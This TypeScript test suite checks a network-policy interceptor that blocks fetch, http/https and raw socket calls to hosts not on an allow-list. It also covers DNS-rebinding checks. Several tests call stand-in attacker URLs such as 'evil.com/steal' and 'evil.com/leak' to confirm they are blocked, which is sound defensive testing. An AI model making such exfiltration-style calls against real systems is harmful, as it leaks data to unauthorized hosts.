import { expect } from 'chai';
import http from 'node:http';
import https from 'node:https';
import net from 'node:net';
import fs from 'node:fs';
import { EventEmitter } from 'node:events';
import {
    installNetworkInterceptors,
    uninstallNetworkInterceptors,
    isNetworkInterceptorsInstalled,
    ensureNetworkInterceptorsInstalled,
} from './interceptor';
import { networkPolicyStorage } from './storage';
import { NetworkPolicyViolationException } from '../executer/exceptions';

const VALIDATED_SOCKET = Symbol.for('siglo.network.validated');

describe('Multi-Layer Network Interceptor Tests', () => {
    const initialGlobalFetch = globalThis.fetch;
    let httpServer: http.Server;
    let httpPort: number;
    let unixServer: net.Server;
    const unixSocketPath = `/tmp/fluid_func_test_${Date.now()}.sock`;

    before(done => {
        httpServer = http.createServer((_req, res) => {
            res.writeHead(200, { 'Content-Type': 'text/plain', connection: 'close' });
            res.end('ok');
        });
        httpServer.listen(0, '127.0.0.1', () => {
            httpPort = (httpServer.address() as net.AddressInfo).port;
            unixServer = net.createServer(c => c.end());
            unixServer.listen(unixSocketPath, () => {
                done();
            });
        });
    });

    after(done => {
        (httpServer as any).closeAllConnections?.();
        (unixServer as any).closeAllConnections?.();
        (globalThis as any).fetch = initialGlobalFetch;
        httpServer.close(() => {
            unixServer.close(() => {
                try {
                    fs.unlinkSync(unixSocketPath);
                } catch {
                    // ignore
                }
                done();
            });
        });
    });

    beforeEach(() => {
        uninstallNetworkInterceptors();
    });

    afterEach(() => {
        uninstallNetworkInterceptors();
    });

    describe('Lifecycle and Idempotency', () => {
        it('installs, ensures, and uninstalls cleanly without double patching', () => {
            const origFetch = globalThis.fetch;
            const origHttp = http.request;
            const origSocket = net.Socket.prototype.connect;

            expect(isNetworkInterceptorsInstalled()).to.be.false;

            installNetworkInterceptors();
            expect(isNetworkInterceptorsInstalled()).to.be.true;
            expect(globalThis.fetch).to.not.equal(origFetch);

            // Double install is a no-op
            installNetworkInterceptors();
            ensureNetworkInterceptorsInstalled();
            expect(isNetworkInterceptorsInstalled()).to.be.true;

            uninstallNetworkInterceptors();
            expect(isNetworkInterceptorsInstalled()).to.be.false;
            expect(globalThis.fetch).to.equal(origFetch);
            expect(http.request).to.equal(origHttp);
            expect(net.Socket.prototype.connect).to.equal(origSocket);

            // Double uninstall is a no-op
            uninstallNetworkInterceptors();
            expect(isNetworkInterceptorsInstalled()).to.be.false;
        });
    });

    describe('Unrestricted Passthrough (no active policy in ASL)', () => {
        it('allows fetch, http, and net.connect when no ALS store is present', async () => {
            installNetworkInterceptors();

            // fetch when unmanaged
            const res = await fetch(`http://127.0.0.1:${httpPort}/`, {
                headers: { connection: 'close' },
            });
            expect(res.status).to.equal(200);

            // http when unmanaged
            await new Promise<void>(resolve => {
                const req = http.request(
                    `http://127.0.0.1:${httpPort}/`,
                    {
                        headers: { connection: 'close' },
                    },
                    r => {
                        r.resume();
                        r.on('end', () => resolve());
                    },
                );
                req.end();
            });

            // https when unmanaged
            const httpsReq = https.request('https://api.stripe.com/test');
            httpsReq.on('error', () => {});
            expect(httpsReq).to.not.be.undefined;
            httpsReq.destroy();

            // socket connect when unmanaged
            await new Promise<void>(resolve => {
                const sock = net.connect(httpPort, '127.0.0.1', () => {
                    sock.end();
                    resolve();
                });
            });
        });
    });

    describe('Native fetch Interceptor', () => {
        beforeEach(() => {
            installNetworkInterceptors();
        });

        it('blocks unauthorized fetch calls and throws NetworkPolicyViolationException', async () => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'chargeStep',
            };

            await networkPolicyStorage.run(policy, async () => {
                try {
                    await fetch('https://evil.com/steal');
                    expect.fail('Should have thrown NetworkPolicyViolationException');
                } catch (err: any) {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.stepName).to.equal('chargeStep');
                    expect(err.requestedUrl).to.equal('https://evil.com/steal');
                    expect(err.requestedHost).to.equal('evil.com');
                    expect(err.allowedHosts).to.deep.equal(['api.stripe.com']);
                    expect(err.retryable).to.be.false;
                    expect(err.phase).to.equal('action');
                    expect(err.message).to.include(
                        "Step 'chargeStep' attempted unauthorized network call to 'evil.com'",
                    );
                }
            });
        });

        it('supports Request and URL objects as fetch input', async () => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'testStep',
            };

            await networkPolicyStorage.run(policy, async () => {
                // Request object
                try {
                    const reqObj = new Request('https://blocked.io/api');
                    await fetch(reqObj);
                    expect.fail('Should have blocked Request object');
                } catch (err: any) {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.requestedHost).to.equal('blocked.io');
                }

                // URL object
                try {
                    const urlObj = new URL('https://blocked.net/data');
                    await fetch(urlObj);
                    expect.fail('Should have blocked URL object');
                } catch (err: any) {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.requestedHost).to.equal('blocked.net');
                }
            });
        });

        it('supports custom stringifiable objects as fetch input', async () => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'customInputStep',
            };

            await networkPolicyStorage.run(policy, async () => {
                const customObj = {
                    toString() {
                        return 'https://blocked-custom.org/test';
                    },
                };
                try {
                    await fetch(customObj as any);
                    expect.fail('Should have blocked custom stringifiable input');
                } catch (err: any) {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.requestedHost).to.equal('blocked-custom.org');
                }
            });
        });

        it('allows authorized fetch and sets inValidatedScope for underlying socket', async () => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'authorizedStep',
            };

            let capturedInValidatedScope = false;

            uninstallNetworkInterceptors();
            const mockOrigFetch = async (_input: any, _init?: any) => {
                const store = networkPolicyStorage.getStore();
                capturedInValidatedScope = Boolean(store?.inValidatedScope);
                return new Response('{"status":"ok"}');
            };
            (globalThis as any).fetch = mockOrigFetch;
            installNetworkInterceptors();

            await networkPolicyStorage.run(policy, async () => {
                const res = await fetch('https://api.stripe.com/v1/charges');
                expect(res).to.not.be.undefined;
                expect(capturedInValidatedScope).to.be.true;
            });

            uninstallNetworkInterceptors();
            (globalThis as any).fetch = initialGlobalFetch;
        });

        it('handles unparseable fetch input by delegating to original fetch', async () => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'invalidUrlStep',
            };

            uninstallNetworkInterceptors();
            let origCalled = false;
            const mockOrig = async () => {
                origCalled = true;
                throw new TypeError('Invalid URL');
            };
            (globalThis as any).fetch = mockOrig;
            installNetworkInterceptors();

            try {
                await networkPolicyStorage.run(policy, async () => {
                    try {
                        await fetch(':::not-a-valid-url:::');
                    } catch (err: any) {
                        expect(err).to.be.instanceOf(TypeError);
                    }
                    expect(origCalled).to.be.true;
                });
            } finally {
                uninstallNetworkInterceptors();
                (globalThis as any).fetch = initialGlobalFetch;
            }
        });
    });

    describe('node:http and node:https Interceptors', () => {
        beforeEach(() => {
            installNetworkInterceptors();
        });

        it('supports URL objects and unparseable target strings in http.request', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'httpRequestUrlStep',
            };

            networkPolicyStorage.run(policy, () => {
                const req1 = http.request(new URL('http://blocked-url-obj.com/path'));
                req1.on('error', (err: any) => {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.requestedHost).to.equal('blocked-url-obj.com');

                    const req2 = http.request('invalid_host_target');
                    req2.on('error', (err2: any) => {
                        expect(err2).to.be.instanceOf(NetworkPolicyViolationException);
                        done();
                    });
                });
            });
        });

        it('blocks unauthorized http.request and emits NetworkPolicyViolationException on error event', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'httpRequestStep',
            };

            networkPolicyStorage.run(policy, () => {
                const req = http.request('http://evil.com/leak', () => {});
                req.on('error', (err: any) => {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.stepName).to.equal('httpRequestStep');
                    expect(err.requestedHost).to.equal('evil.com');
                    done();
                });
            });
        });

        it('blocks unauthorized http.get and exercises BlockedClientRequest dummy methods', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'httpGetStep',
            };

            networkPolicyStorage.run(policy, () => {
                const req = http.get({ host: 'unauthorized.org', port: 80, path: '/test' });
                // Exercise all dummy methods
                req.setHeader('X-Custom', 'val');
                expect(req.getHeader('X-Custom')).to.be.undefined;
                expect(req.getHeaders()).to.deep.equal({});
                expect(req.getHeaderNames()).to.deep.equal([]);
                expect(req.hasHeader('X-Custom')).to.be.false;
                req.removeHeader('X-Custom');
                expect(req.write('chunk')).to.be.false;
                req.setTimeout(1000);
                req.setNoDelay();
                req.setSocketKeepAlive();
                req.flushHeaders();
                req.abort();
                req.destroy();

                req.on('error', (err: any) => {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.requestedHost).to.equal('unauthorized.org:80');
                    done();
                });
            });
        });

        it('blocks unauthorized https.request and https.get', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'httpsStep',
            };

            networkPolicyStorage.run(policy, () => {
                const req = https.get('https://malicious.net/data');
                req.on('error', (err: any) => {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.requestedHost).to.equal('malicious.net');
                    done();
                });
            });
        });

        it('allows authorized http.request and marks socket as validated', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'allowedHttp',
            };

            networkPolicyStorage.run(policy, () => {
                const req = http.get(
                    `http://127.0.0.1:${httpPort}/`,
                    {
                        headers: { connection: 'close' },
                    },
                    res => {
                        expect(res.statusCode).to.equal(200);
                        done();
                    },
                );
                req.on('error', done);
            });
        });

        it('allows authorized https.request and marks socket as validated', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'allowedHttps',
            };

            uninstallNetworkInterceptors();
            const dummyEmitter: any = new EventEmitter();
            dummyEmitter.end = () => dummyEmitter;
            dummyEmitter.on = EventEmitter.prototype.on.bind(dummyEmitter);

            const origHttps = https.request;
            (https as any).request = () => dummyEmitter;
            installNetworkInterceptors();

            networkPolicyStorage.run(policy, () => {
                https.request('https://api.stripe.com/v1/charges');
                const dummySocket: any = {};
                dummyEmitter.emit('socket', dummySocket);
                expect(dummySocket[VALIDATED_SOCKET]).to.be.true;

                uninstallNetworkInterceptors();
                (https as any).request = origHttps;
                done();
            });
        });
    });

    describe('node:net.Socket.prototype.connect Interceptor', () => {
        beforeEach(() => {
            installNetworkInterceptors();
        });

        it('blocks raw unauthorized TCP connection and emits NetworkPolicyViolationException on socket error', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'rawTcpStep',
            };

            networkPolicyStorage.run(policy, () => {
                const socket = new net.Socket();
                socket.connect({ host: 'evil.com', port: 9999 });
                socket.on('error', (err: any) => {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.stepName).to.equal('rawTcpStep');
                    expect(err.requestedHost).to.equal('evil.com');
                    done();
                });
            });
        });

        it('blocks raw TCP connection with (port, host) arguments format', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: true,
                stepName: 'rawTcpArgStep',
            };

            networkPolicyStorage.run(policy, () => {
                const socket = new net.Socket();
                socket.connect(8888, 'malicious.xyz');
                socket.on('error', (err: any) => {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.requestedHost).to.equal('malicious.xyz');
                    done();
                });
            });
        });

        it('permits Unix domain sockets when explicitly in allowUnixSockets', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: [],
                allowLocalhost: true,
                allowUnixSockets: [unixSocketPath],
                stepName: 'unixStep',
            };

            networkPolicyStorage.run(policy, () => {
                const socket1 = new net.Socket();
                socket1.connect(unixSocketPath, () => {
                    socket1.end();
                    const socket2 = net.connect({ path: unixSocketPath }, () => {
                        socket2.end();
                        done();
                    });
                });
            });
        });

        it('blocks unauthorized Unix domain sockets when not in allowUnixSockets', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: [],
                allowLocalhost: true,
                stepName: 'unixStep',
            };

            networkPolicyStorage.run(policy, () => {
                const socket1 = new net.Socket();
                const socket = new net.Socket();
                socket.on('error', (err: any) => {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    done();
                });
                socket.connect(unixSocketPath);
            });
        });

        it('bypasses socket connect when socket is already validated or in inValidatedScope', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: [],
                allowLocalhost: true,
                stepName: 'validatedSocketStep',
            };

            networkPolicyStorage.run(policy, () => {
                const socket1 = new net.Socket();
                (socket1 as any)[VALIDATED_SOCKET] = true;
                socket1.connect(httpPort, '127.0.0.1', () => {
                    socket1.end();

                    networkPolicyStorage.run({ ...policy, inValidatedScope: true }, () => {
                        const socket2 = net.connect(httpPort, '127.0.0.1', () => {
                            socket2.end();
                            done();
                        });
                    });
                });
            });
        });

        it('supports http.request and https.request called with options object', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['127.0.0.1'],
                allowLocalhost: true,
                stepName: 'optionsStep',
            };

            networkPolicyStorage.run(policy, () => {
                const req = http.request({ hostname: '127.0.0.1', port: httpPort, method: 'GET' }, res => {
                    expect(res.statusCode).to.equal(200);
                    const httpsReq = https.request({ hostname: '127.0.0.1', port: 443, method: 'GET' });
                    httpsReq.on('error', () => {});
                    httpsReq.destroy();
                    done();
                });
                req.end();
            });
        });

        it('supports http.request and https.request called with string URL without options object', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['127.0.0.1'],
                allowLocalhost: true,
                stepName: 'urlOnlyStep',
            };

            networkPolicyStorage.run(policy, () => {
                const req = http.request(`http://127.0.0.1:${httpPort}`, res => {
                    expect(res.statusCode).to.equal(200);
                    const httpsReq = https.request('https://127.0.0.1:443', () => {});
                    httpsReq.on('error', () => {});
                    httpsReq.destroy();
                    done();
                });
                req.end();
            });
        });

        it('catches DNS rebinding to restricted IP via wrapLookup in http.request', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['public-service.com'],
                allowLocalhost: false,
                stepName: 'dnsRebindHttp',
            };

            networkPolicyStorage.run(policy, () => {
                const customLookup = (_hostname: string, _opts: any, cb: any) => {
                    const callback = typeof _opts === 'function' ? _opts : cb;
                    callback(null, [{ address: '127.0.0.1', family: 4 }]);
                };

                const req = http.request({
                    hostname: 'public-service.com',
                    port: 80,
                    lookup: customLookup,
                });

                req.on('error', err => {
                    expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                    expect(err.message).to.include('restricted IP');
                    done();
                });
            });
        });

        it('passes through DNS lookup error in wrapLookup', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['public-service.com'],
                allowLocalhost: false,
                stepName: 'dnsErrorHttp',
            };

            networkPolicyStorage.run(policy, () => {
                const customLookup = (_hostname: string, _opts: any, cb: any) => {
                    const callback = typeof _opts === 'function' ? _opts : cb;
                    callback(new Error('DNS resolution error'));
                };

                const req = http.request({
                    hostname: 'public-service.com',
                    port: 80,
                    lookup: customLookup,
                });

                req.on('error', err => {
                    expect(err.message).to.include('DNS resolution error');
                    done();
                });
            });
        });

        it('permits public IP via wrapLookup', done => {
            const policy = {
                enabled: true,
                defaultPolicy: 'deny' as const,
                allowedHosts: ['public-service.com'],
                allowLocalhost: false,
                stepName: 'dnsPublicHttp',
            };

            networkPolicyStorage.run(policy, () => {
                const customLookup = (_hostname: string, _opts: any, cb: any) => {
                    const callback = typeof _opts === 'function' ? _opts : cb;
                    callback(null, '93.184.216.34', 4);
                };

                const req = http.request({
                    hostname: 'public-service.com',
                    port: 80,
                    lookup: customLookup,
                });

                let called = false;
                const finish = () => {
                    if (!called) {
                        called = true;
                        done();
                    }
                };

                req.on('socket', () => {
                    req.destroy();
                    finish();
                });
                req.on('error', () => {
                    finish();
                });
            });
        });
    });
});
